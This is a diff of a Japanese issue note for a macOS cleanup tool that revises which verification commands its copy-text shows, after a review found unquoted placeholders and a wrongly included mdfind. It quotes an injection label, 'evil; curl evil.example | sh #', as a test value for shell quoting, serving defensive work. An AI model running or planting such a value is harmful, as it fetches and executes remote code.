@@ -14,28 +14,85 @@
 自分で確かめるコマンド**が入っていない。issue 148 は Y を「別セッションの LLM にそのまま投げられる形」と定義しているので、
 裏取り手段が無いと受け手は判定を鵜呑みにするしかない。
 
-## 対応案
+## 対応案 (2026-09-03 の反証レビューで書き直した)
 
-ID / 種別ごとに 1 行足す。体 6 が作った対応表:
+⚠️ **起票時 (2026-09-02) の表をそのまま実装してはいけない。** レビューが P1 を 2 件、P2 を 2 件出し、
+すべて実コードで裏が取れた。以下は訂正後。
 
-| ID / 種別 | 裏取りコマンド |
-|---|---|
-| Paths 系すべて | `du -sk <各 Item.Path>` |
-| simulator-runtimes | `xcrun simctl runtime list -j` |
-| coresimulator-orphan | `xcrun simctl list devices -j \| grep <UUID>` (無ければ孤児) |
-| orphan-container | `mdfind "kMDItemCFBundleIdentifier == '<id>'"` / `ls /Applications ~/Applications` |
-| brew-orphan-state / brew-cleanup-residue | `brew info --json=v2 --installed \| jq '.formulae[].name'` / `brew cleanup --dry-run` |
-| versionmanager-orphan-root | `echo $RBENV_ROOT $NODENV_ROOT $GOENV_ROOT` / `rbenv root` |
-| chrome-tmp (blocked) | `pgrep -x "Google Chrome Canary"` |
-| xctest-* / launchd-tmp (boottime 判定) | `sysctl kern.boottime` + `stat -f %Sm <path>` |
-| svc A (実行ファイル不在) | `ls -l <MissingExec>` / `plutil -p <plist> \| grep -A2 Program` |
-| svc B (再起動ループ) | `launchctl list \| grep <label>` / `launchctl print gui/$(id -u)/<label>` |
-| svc C (brew 孤児) | `brew list --formula \| grep <formula>` |
+### 🚨 必須の前提: プレースホルダは必ず `svc.ShellQuote` を通す
 
-⚠️ `orphan-container` の `mdfind` は単独の判定材料にしない (issue 148 の「`mdfind` 単独に置かないこと」)。
-**裏取り用**として出すのは問題ないが、コピー文にもその注意を 1 行添える。
+起票時の表は `du -sk <各 Item.Path>` のように**引用なしのプレースホルダ**で書いていた。
+そのまま実装すると **issue 178 / 193 が塞いだ穴を新設する**。
+
+`src/doctor/svc/scan.go` は 2026-09-03 の敵対レビューを受けて `shellSafeRe` (allowlist) +
+`ShellQuote` を新設し、「**パスをコマンド行へ入れる経路は必ずここを通す**」と明文化している
+(`manualCommands` のコメント: Label は plist が決める任意文字列で、
+`evil; curl evil.example | sh #` のようなラベルが**実走査で成立する**)。
+Container 名と `Item.Path` も攻撃者が置ける値なので同じ扱いが要る。
+
+### 訂正後の表
+
+| ID / 種別 | 裏取りコマンド | 起票時からの変更 |
+|---|---|---|
+| `simulator-runtimes` | `xcrun simctl runtime list -j` | — (実測 rc=0) |
+| `coresimulator-orphan` | `xcrun simctl list devices -j` (出力から UUID を探す) | `\| grep <UUID>` をやめる (UUID の引用が要るうえ、JSON を grep させる形が雑) |
+| `orphan-container` | `ls /Applications ~/Applications` | 🚨 **`mdfind` を削除**。下記 |
+| `brew-orphan-state` / `brew-cleanup-residue` | `brew list --formula` / `brew cleanup --dry-run` | `brew info --json=v2 --installed \| jq` をやめる (実測で数百 KB の JSON。実装の台帳は 1 つなので svc C と同じ `brew list --formula` に揃える) |
+| `versionmanager-orphan-root` | `echo $RBENV_ROOT $NODENV_ROOT $GOENV_ROOT` / `rbenv root` | — |
+| `chrome-tmp` (blocked) | (足さない) | **削除**。blocked の Reason が既にプロセス名を名指ししており、`pgrep -x` は不在時 rc=1 / 出力空で読み手に曖昧 |
+| `xctest-*` / `launchd-tmp` (boottime) | `sysctl kern.boottime` | `stat -f %Sm <path>` を削除 (`diskCopyText` が各 Item の最終更新を既に出す) |
+| **`finder-nsird`** | `ls -la <各 Item.Path>` (コピー元が残っているか目で見る) | 🆕 **追加**。カタログにあるのに表から漏れていた |
+| **`swiftui-drag-cache`** | 同上 | 🆕 **追加**。同上 |
+| svc A (実行ファイル不在) | `ls -l <MissingExec>` / `plutil -p <plist>` | `\| grep -A2 Program` をやめる (plutil の出力は短い) |
+| svc B (再起動ループ) | `launchctl list \| grep <label>` / `launchctl print <Domain>/<Label>` | 🚨 **`gui/$(id -u)/` 決め打ちをやめる**。`f.Domain` は `system` を取りうる (`Annotations` が「system は launchctl list に出ない」と明記)。`manualCommands` と同じく `f.Domain+"/"+f.Label` にする |
+| svc C (brew 孤児) | `brew list --formula` | — |
+
+**`du -sk <path>` は全 ID から削除した**。`diskCopyText` は各 Item の `HumanSize`、最終更新、合計、
+`Contents` を既に出しており、`du` は情報を増やさない。
+
+### 🚨 `mdfind` は載せない (起票時の判定が誤りだった)
+
+起票時は「単独の判定材料にしないという注意を添えれば載せてよい」と書いたが、**誤り**。
+`src/doctor/disk/catalog.go` の `orphan-container` の Detail は
+「`/Applications` と `~/Applications` の Info.plist を**実走査して突合 (mdfind は使わない)**」で、
+判定は `GuardOrphanApp` が実走査でやっている。**既に否定された手段をコピー文で復活させる**形になる。
+
+### svc 側は一部が既に済んでいる (起票時に見落としていた)
+
+`svcUndiagnosedCopyText` (`doctor_view.go`) は **issue 180 の対応で既に**
+`plutil -p` / `ls -l` を **`ShellQuote` 付きで**出している。この issue の対象は
+`diskCopyText` と `svcCopyText` の 2 つ。
+
+⚠️ `svcCopyText` が出している `f.Commands` は `manualCommands` = `launchctl bootout` / `rm` の
+**破壊コマンド**で、裏取り (読み取り) ではない。**ここが本当の欠落**。
 
 ## 受け入れ条件
 
 - [ ] 各 ID のコピー文に裏取りコマンドが入っている (プレースホルダが実値に置換されている)
-- [ ] `mdfind` に「単独の判定材料にしない」注記が付いている
+- [ ] 🚨 **すべてのプレースホルダが `svc.ShellQuote` を通っている**。細工した Path / Label /
+      Container 名がコマンド行を壊さないことを、`evil; curl evil.example | sh #` を含む値で固定する
+- [ ] `launchctl print` が `f.Domain` を使っている (`gui/$(id -u)/` の決め打ちでない)
+- [ ] `mdfind` を**出していない**こと (規律に反する。起票時の判断が誤りだった)
+- [ ] 変異検証: `ShellQuote` を外すとテストが red になる
+
+## この issue の反証レビュー (2026-09-03、opus)
+
+issue 207 の約束「183 に着手するときその issue だけ反証レビューを通す」に従って実施。
+**起票から 1 日で周辺が動いており、表をそのまま実装すると P1 が 2 件立つ**ことが分かった。
+
+| 指摘 | 判定 |
+|---|---|
+| P1: プレースホルダが引用なしで、178/193 の信頼境界と衝突 | **採用**。`ShellQuote` を必須にした |
+| P1: `mdfind` はカタログが「使わない」と明記した手段 | **採用**。表から削除した |
+| P2: `svcUndiagnosedCopyText` は 180 で既に対応済み (対象から漏れていた) | **採用**。対象を明記した |
+| P2: `launchctl print` の `gui/` 決め打ちは `system` ドメインで誤り | **採用**。`f.Domain` を使う |
+| P2: `finder-nsird` / `swiftui-drag-cache` が表から漏れている | **採用**。追加した |
+| P3: `du -sk` / `stat -f %Sm` / `pgrep` は既存出力と重複 | **採用**。削除した |
+| P3: brew の 2 行が非対称 (実装の台帳は 1 つ) | **採用**。`brew list --formula` に揃えた |
+
+**反証できなかった主張**: 「`diskCopyText` に裏取りコマンドが 1 つも無い」は真 (関数全文を確認)。
+提案コマンドの有効性も実測で確認 (`xcrun simctl runtime list -j` / `list devices -j` /
+`sysctl kern.boottime` / `stat -f %Sm` / `brew info` はいずれも rc=0)。
+179 / 182 / 193 がこの issue を先取りしている事実は無し。
+
+**未確認**: 「コピー文が長すぎて逆効果になる」形 (実際の行数を測っていない)。実装時に測る。
